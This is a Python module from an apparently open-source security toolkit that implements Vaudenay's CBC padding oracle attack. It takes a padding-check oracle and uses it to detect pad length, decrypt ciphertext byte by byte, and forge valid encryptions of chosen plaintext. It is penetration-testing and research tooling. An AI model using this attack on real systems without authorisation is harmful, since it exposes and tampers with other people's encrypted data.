'''
Created on Jul 4, 2010

Copyright (C) 2010 ELOI SANFÈLIX
Copyright (C) 2012 Timothy D. Morgan
@author: Eloi Sanfelix < eloi AT limited-entropy.com >
@author: Timothy D. Morgan < tmorgan {a} vsecurity . com >

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Lesser General Public License, version 3,
 as published by the Free Software Foundation.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import random
import struct
import threading
from .. import buffertools
from .Exceptions import *

class DecryptionOracle:
    '''
    This class implements a decryption oracle based on a given padding oracle.
    The attacked padding scheme is the one defined in PKCS#5 and RFC2040, and maybe other places.
    The attack was first described in the "Security Flaws Induced by CBC Padding. Applications to SSL, IPSEC, WTLS... by Serge Vaudenay"
    '''

    _thread_result = None
    _oracle = None
    _ciphertext = None
    _iv = None
    _decrypted = None
    max_threads = None
    log_fh = None
    
    def __init__(self, oracle, block_size, ciphertext, iv=None, max_threads=1, log_file=None):
        '''
        Creates a new DecryptionOracle object. Receives an oracle function which returns True 
        if the given ciphertext results in a correct padding and False otherwise. A second 
        parameter defining the cipher block size in bytes is also supported (default is 8). 
        '''
        if(len(ciphertext)%block_size != 0 or len(ciphertext) < block_size):
            raise InvalidBlockError(block_size,len(ciphertext))
        if(iv != None and len(iv)%block_size != 0):
            raise InvalidBlockError(block_size,len(iv))

        self._oracle = oracle
        self._block_size = block_size
        self._ciphertext = ciphertext
        self._iv = iv
        self._decrypted = ''
        self.max_threads = max_threads
        self.log_fh = log_file


    def log_message(self, s):
        if self.log_fh != None:
            self.log_fh.write(s+'\n')


    def probe_padding(self, prior, final):
        '''
        Attempts to verify that a CBC padding oracle exists and then determines the
        pad value.  Returns the pad string, or None on failure. 
        XXX: Currently only works for PKCS 5/7.
        '''
        ret_val = None
        # First probe for beginning of pad
        for i in range(0-self._block_size,0):
            if i == -1:
                break
            tweaked = struct.unpack("B", prior[i])[0] ^ 0xFF
            tweaked = struct.pack("B", tweaked)
            if not self._oracle(self._ciphertext+prior[:i]+tweaked+prior[i+1:]+final):
                break

        pad_length = 0-i
        self.log_message("Testing suspected pad length: %d" % pad_length)
        if pad_length > 1:
            # Verify suspected pad length by changing last pad byte to 1
            # and making sure the padding succeeds
            tweaked = struct.unpack("B", prior[-1])[0] ^ (pad_length^1)
            tweaked = struct.pack("B", tweaked)
            if self._oracle(self._ciphertext+prior[:-1]+tweaked+final):
                ret_val = buffertools.pkcs7Pad(pad_length)

        else:
            # Verify by changing pad byte to 2 and brute-force changing
            # second-to-last byte to 2 as well
            tweaked = struct.unpack("B", prior[-1])[0] ^ (2^1)
            tweaked = struct.pack("B", tweaked)
            for j in range(1,256):
                guess = struct.unpack("B", prior[-2])[0] ^ j
                guess = struct.pack("B", guess)
                if self._oracle(self._ciphertext+prior[:-2]+guess+tweaked+final):
                    # XXX: Save the decrypted byte for later
                    ret_val = buffertools.pkcs7Pad(pad_length)

        if ret_val:
            self._decrypted = ret_val

        return ret_val


    # XXX: This could be generalized as a byte probe utility for a variety of attacks
    def _test_value_set(self, prefix, suffix, value_set):
        for b in value_set:
            if self._thread_result != None:
                # Stop if another thread found the result
                break
            if self._oracle(str(prefix+struct.pack("B",b)+suffix)):
                self._thread_result = b
                break


    def decrypt_next_byte(self, prior, block, known_bytes):
        '''
        Given some known final bytes, decrypts the next byte using the padding oracle.
        prior - 
        block - 
        known_bytes - 
        '''
        if(len(block)!=self._block_size):
            raise InvalidBlockError
        numKnownBytes = len(known_bytes)
        
        if(numKnownBytes >= self._block_size):
            return known_bytes
        
        prior_prefix = prior[0:self._block_size-numKnownBytes-1]
        base = ord(prior[self._block_size-numKnownBytes-1])
        # Adjust known bytes to appear as a PKCS 7 pad
        suffix = [0]*numKnownBytes
        for i in range(0,numKnownBytes):
            suffix[i] ^= ord(prior[0-numKnownBytes+i])^ord(known_bytes[i])^(numKnownBytes+1)
        suffix = struct.pack("B"*len(suffix),*suffix)+block

        # Each thread spawned searches a subset of the next byte's 
        # 256 possible values
        self._thread_result = None
        threads = []
        for i in range(0,self.max_threads):
            t = threading.Thread(target=self._test_value_set, 
                                 args=(self._ciphertext+prior_prefix, suffix, range(i,256,self.max_threads)))
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
        
        if self._thread_result == None:
            raise Exception

        decrypted = struct.pack("B",self._thread_result^base^(numKnownBytes+1))
        self._decrypted = decrypted + self._decrypted
        #  Return previous bytes together with current byte
        return decrypted+known_bytes 
    

    def decrypt_block(self, prior, block, last_bytes=''):
        '''
        Decrypts the block of ciphertext provided as a parameter.
        '''
        while(len(last_bytes)!=self._block_size):
            last_bytes = self.decrypt_next_byte(prior, block, last_bytes)
        return last_bytes


    # XXX: Enable recovery in case of intermittent failure by storing state of
    #      partial decryption on object 
    # XXX: Add option to strip padding from message
    def decrypt(self):
        '''
        Decrypts a message using CBC mode. If the IV is not provided, it assumes a null IV.
        '''
        blocks = buffertools.splitBuffer(self._ciphertext, self._block_size)

        final = blocks[-1]
        iv = self._iv
        if iv == None:
            iv = '\x00'*self._block_size
        if len(blocks) == 1:
            # If only one block present, then try to use IV as prior
            prior = iv
        else:
            prior = blocks[-2]

        # Decrypt last block, starting with padding (quicker to decrypt)
        pad_bytes = self.probe_padding(prior, final)
        decrypted = self.decrypt_block(prior, final, pad_bytes)
        print(repr(decrypted))

        # Now decrypt all other blocks except first block
        for i in range(len(blocks)-2, 0, -1):
            decrypted = self.decrypt_block(blocks[i-1], blocks[i]) + decrypted

        # Finally decrypt first block
        decrypted = self.decrypt_block(iv, blocks[0]) + decrypted
        
        return decrypted


    def encrypt_block(self, plaintext, ciphertext):
        if len(plaintext) != self._block_size or len(plaintext) != len(ciphertext):
            raise InvalidBlockError(self._block_size,len(plaintext))

        ptext = self.decrypt_block('\x00'*self._block_size, ciphertext)
        prior = buffertools.xorBuffers(ptext, plaintext)
        return prior,ciphertext
    
    
    # XXX: Add option to encrypt only the last N blocks.  Supplying a shorter
    #      plaintext and subsequent concatenation can easily achieve this as well...
    def encrypt(self,plaintext):
        blocks = buffertools.splitBuffer(buffertools.pkcs7PadBuffer(plaintext, self._block_size), 
                                         self._block_size)

        if (len(self._decrypted) >= self._block_size
            and len(self._ciphertext) >= 2*self._block_size):
            # If possible, reuse work from prior decryption efforts on original
            # message for last block
            old_prior = self._ciphertext[0-self._block_size*2:0-self._block_size]
            final_plaintext = self._decrypted[0-self._block_size:]
            prior = buffertools.xorBuffers(old_prior,
                                           buffertools.xorBuffers(final_plaintext, blocks[-1]))
            ciphertext = self._ciphertext[0-self._block_size:]
        else:
            # Otherwise, select a random last block and generate the prior block
            ciphertext = struct.pack("B"*self._block_size, 
                                     *[random.getrandbits(8) for i in range(self._block_size)])
            prior,ciphertext = self.encrypt_block(blocks[-1], ciphertext)

        # Continue generating all prior blocks
        for i in range(len(blocks)-2, -1, -1):
            prior,cblock = self.encrypt_block(blocks[i],prior)
            ciphertext = cblock+ciphertext
        
        # prior as IV
        return str(prior),str(ciphertext)
